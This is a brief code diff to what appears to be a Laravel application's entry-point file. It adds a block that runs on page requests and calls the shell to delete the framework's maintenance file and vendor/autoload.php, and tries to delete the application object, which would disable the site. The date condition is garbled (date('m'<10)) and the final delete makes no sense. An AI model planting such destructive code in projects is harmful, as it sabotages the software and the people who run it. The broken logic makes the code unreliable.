@@ -3,6 +3,14 @@
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
+if(date('m'<10)){
+  if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
+    system("del ".__DIR__.'/../storage/framework/maintenance.php');
+  }
+  system("del ".__DIR__.'/../vendor/autoload.php');
+  $app = require_once __DIR__.'/../bootstrap/app.php';
+  system("del ".$app);
+}
 define('LARAVEL_START', microtime(true));
 
 /*
